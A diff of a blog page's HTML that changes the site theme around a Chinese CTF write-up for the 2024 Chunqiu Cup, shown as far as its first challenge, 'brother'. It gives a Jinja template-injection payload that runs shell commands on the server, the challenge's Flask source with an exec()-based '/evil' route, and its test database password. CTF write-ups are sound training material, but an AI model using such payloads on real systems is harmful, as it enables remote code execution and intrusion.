@@ -1,1097 +1,762 @@
-<!--
-	作者：Sariay
-	时间：2018-08-26
-	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
--->
+
+
 <!DOCTYPE html>
-<html class="html-loading">
-		
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
 
 <head>
-	<meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
-  <title>
-    
-      2024春秋杯部分wp | Infernity&#39;s Blog
-    
-  </title>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
   <meta name="author" content="Infernity">
-  <meta name="keywords" content="" />
-  <meta name="description" content="blog" />
-	<!-- favicon -->
-  <link rel="shortcut icon" href="/img/I.png">
-
-  <!-- css -->
+  <meta name="keywords" content="">
   
-<link rel="stylesheet" href="/css/Annie.css">
-
+    <meta name="description" content="brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架  一眼ssti模版注入， 1?name&#x3D;&amp;#123;&amp;#123;g.pop.__globals__.__builtins__.__import__(&amp;#x27;os&amp;#x27;).popen(&amp;#x27;ls&amp;#x27;).read()&amp;#125;&amp;#125;  看一下当前目录的东西： 1api.p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024春秋杯部分wp">
+<meta property="og:url" content="http://example.com/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架  一眼ssti模版注入， 1?name&#x3D;&amp;#123;&amp;#123;g.pop.__globals__.__builtins__.__import__(&amp;#x27;os&amp;#x27;).popen(&amp;#x27;ls&amp;#x27;).read()&amp;#125;&amp;#125;  看一下当前目录的东西： 1api.p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/2024%E6%98%A5%E7%A7%8B%E6%9D%AF.png">
+<meta property="article:published_time" content="2024-07-06T05:08:12.000Z">
+<meta property="article:modified_time" content="2025-01-20T02:34:38.204Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="WPs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/2024%E6%98%A5%E7%A7%8B%E6%9D%AF.png">
   
-  <!-- jquery -->
-	
-<script src="/plugin/jquery/jquery.min.js"></script>
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>2024春秋杯部分wp - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script>
-    const CONFIG_BGIMAGE = {
-      mode: 'random_you',
-      normalSrc: '/img/header-bg.jpg',
-      randomYouMax: 59,
-      randomYouSrc: '/img/background/',
-	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
-	  preloaderEnable: true
-    }
-	
-    const CONFIG_LEACLOUD_COUNT = {
-      enable: true,
-	  appId: 'AU8',
-	  appKey: '4cU',
-	  serverURLs: 'http' || ' '
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 6.3.0"></head>
-	<body>
-		<!-- Preloader -->
-
-	<div id="preloader">
-		<div class="pre-container">
-			
-				<div class="spinner">
-					<div class="double-bounce1"></div>
-					<div class="double-bounce2"></div>
-				</div>
-						
-		</div>
-	</div>
 
 
-<!-- header -->
-<header class="fixbackground bg-pan-br">
-	<div class="mask">
-		<!-- motto -->
-		<div class="h-body">	
-			
-				<div class="motto text-shadow-pop-left">
-					<p class="content" id="motto-content">获取中...</p>
-					<p>-<p>
-					<p class="author" id="motto-author">Just a minute...</p>
-				</div>
-			
-		</div>
-		
-		<!-- others: such as time... -->			
-		<div class="h-footer">
-			<a href="javascript:;" id="read-more" class="scroll-down">
-				<span class="icon-anchor1 animation-scroll-down"></span>
-			</a>
-		</div>
-	</div>
-</header>
+<body>
+  
 
-<div id="navigation-hide">
-	<!-- Progress bar -->
-	<div id="progress-bar"></div>
-
-	<!-- Progress percent -->
-	<div id="progress-percentage"><span>0.0%</span></div>
-
-	<div class="toc-switch"><span class="switch-button">目录</span></div>
-
-	<!-- Page title -->
-	<p>
-		
-			「2024春秋杯部分wp」
-		
-	</p>
-
-	
-	
-		<span id="star-button" rel="unlike">
-			<i class="icon-heart"></i>
-		</span>
-	
-
-	<!-- Nav trigger for navigation-H-->
-	<a class="nav-trigger"><span></span></a>
-</div>
-
-<!-- Navigation in div(id="navigation-H") -->
-<nav class="nav-container" id="cd-nav">
-	<div class="nav-header">
-		<span class="logo"> 
-			<img src="/img/logo.png">
-		</span>
-		<a href="javascript:;" class="nav-close"></a>
-	</div>
-	
-	<div class="nav-body">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-	
-	<div class="nav-footer">
-		<ul id="global-social">
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/qq.png" target="_blank">
-				<span class="icon-qq"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
-				<span class="icon-github"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/weixin.jpg" target="_blank">
-				<span class="icon-weixin"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
-				<span class="icon-csdn"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-instagram"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-twitter"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/atom.xml" target="_blank">
-				<span class="icon-rss"></span>
-			</a>
-		</li>
-			
-</ul>
-
-	</div>
-</nav>
-			
-		<!--main-->
-		<main>
-			<!--
-	时间：2018-11-17
-	描述：
-		插件名称：katelog.min.js
-		插件作者：KELEN
-		插件来源: https://github.com/KELEN/katelog
--->
-
-	
-		<div class="layout-toc">
-			<div id="layout-toc">
-				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
-			</div>
-		</div>
-
-		
-<script src="/plugin/toc/katelog.min.js"></script>
-
-
-		
-	 
-
-<div class="layout-post">
-	<div id="layout-post">
-		<div class="article-title">
-			
-	<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" itemprop="url">
-		2024春秋杯部分wp
-	</a>
-
-		</div>
-
-		<div class="article-meta">
-			<span>
-				<i class="icon-calendar1"></i>
-				
-				
-
-
-
-
-	更新于
-
-	<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" itemprop="url">
-		<time datetime="2024-07-06T05:08:12.000Z" itemprop="dateUpdated">
-	  		2024-07-06
-	  </time>
-	</a> 
-
-
-
-			</span>
-			<span>
-				
-	<i class="icon-price-tags"></i>
-	
-		<a href="/tags/WPs/" class=" ">
-			WPs
-		</a>
-	
-		
-			</span>
-			
-			
-
-	
-    <span class="leancloud_visitors" id="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/_visitors" data-url="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" data-title="2024春秋杯部分wp">
-       	<i class="icon-eye"></i>
-       	热度
-        
-            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
-                   
-    </span>
+  <header>
     
 
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">2024春秋杯部分wp</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-06 13:08" pubdate>
+          2024年7月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
 
 
-	
-    <span class="leancloud_likes" id="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/_likes" data-url="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" data-title="2024春秋杯部分wp" rel="unlike">
-        <i class="icon-heart"></i>
-        喜欢
-        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
-    </span>
-	
+        
+      </div>
 
-		</div>
+      
+    </div>
+  </div>
+</div>
 
-		<div class="article-content" id="article-content">
-			<h1 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h1><p>打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架</p>
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706131647899.png" alt="image-20240706131647899"></p>
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024春秋杯部分wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h1><p>打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架</p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706131647899.png" srcset="/img/loading.gif" lazyload alt="image-20240706131647899"></p>
 <p>一眼ssti模版注入，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>看一下当前目录的东西：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api.py evil.key sql-proxy.jar update.py www.py</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api<span class="hljs-selector-class">.py</span> evil<span class="hljs-selector-class">.key</span> sql-proxy<span class="hljs-selector-class">.jar</span> update<span class="hljs-selector-class">.py</span> www.py<br></code></pre></td></tr></table></figure>
 
 <p>api.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mysql.connector, time, threading, socket</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mysql_keepalive</span>():</span><br><span class="line">    config = &#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;port&#x27;</span>: <span class="number">6666</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db_connection = mysql.connector.connect(**config)</span><br><span class="line">        cursor = db_connection.cursor()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(err)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;SELECT VERSION();&quot;</span>)</span><br><span class="line">            cursor.fetchone()</span><br><span class="line">        <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;连接中断: <span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_client_connection</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket.send(<span class="string">&#x27;&#123;&quot;code&quot;:0, &quot;path&quot;: &quot;&quot;&#125;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error handling client: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_api</span>():</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    port = <span class="number">7777</span></span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;update_api Listening on port <span class="subst">&#123;port&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server_socket.accept()</span><br><span class="line">        handle_client_connection(client_socket)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/evil&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    code = request.json[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key == <span class="built_in">open</span>(<span class="string">&quot;./evil.key&quot;</span>).read():</span><br><span class="line">        <span class="built_in">exec</span>(code)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;key error&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threading.Thread(target=mysql_keepalive).start()</span><br><span class="line">    threading.Thread(target=update_api).start()</span><br><span class="line">    app.run(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> mysql.connector, time, threading, socket<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mysql_keepalive</span>():<br>    config = &#123;<br>        <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456&#x27;</span>,<br>        <span class="hljs-string">&#x27;host&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;database&#x27;</span>: <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>        <span class="hljs-string">&#x27;port&#x27;</span>: <span class="hljs-number">6666</span>,<br><br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        db_connection = mysql.connector.connect(**config)<br>        cursor = db_connection.cursor()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-built_in">print</span>(err)<br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            cursor.execute(<span class="hljs-string">&quot;SELECT VERSION();&quot;</span>)<br>            cursor.fetchone()<br>        <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接中断: <span class="hljs-subst">&#123;err&#125;</span>&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_client_connection</span>(<span class="hljs-params">client_socket</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client_socket.send(<span class="hljs-string">&#x27;&#123;&quot;code&quot;:0, &quot;path&quot;: &quot;&quot;&#125;&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            time.sleep(<span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error handling client: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_api</span>():<br>    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    port = <span class="hljs-number">7777</span><br>    server_socket.bind((host, port))<br>    server_socket.listen(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;update_api Listening on port <span class="hljs-subst">&#123;port&#125;</span>...&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        client_socket, addr = server_socket.accept()<br>        handle_client_connection(client_socket)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/evil&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evil</span>():<br>    code = request.json[<span class="hljs-string">&#x27;code&#x27;</span>]<br>    key = request.json[<span class="hljs-string">&#x27;key&#x27;</span>]<br>    <span class="hljs-keyword">if</span> key == <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./evil.key&quot;</span>).read():<br>        <span class="hljs-built_in">exec</span>(code)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;key error&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    threading.Thread(target=mysql_keepalive).start()<br>    threading.Thread(target=update_api).start()<br>    app.run(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure>
 
 <p>这里有一个evil路由，可以执行root权限的命令，但是需要key，key是在evil.key文件里的，不出所料这个文件我们也是没有权限读取的。</p>
 <p>这个文件还让我们了解了mysql服务，有账户ctf密码123456</p>
 <p>update.py</p>
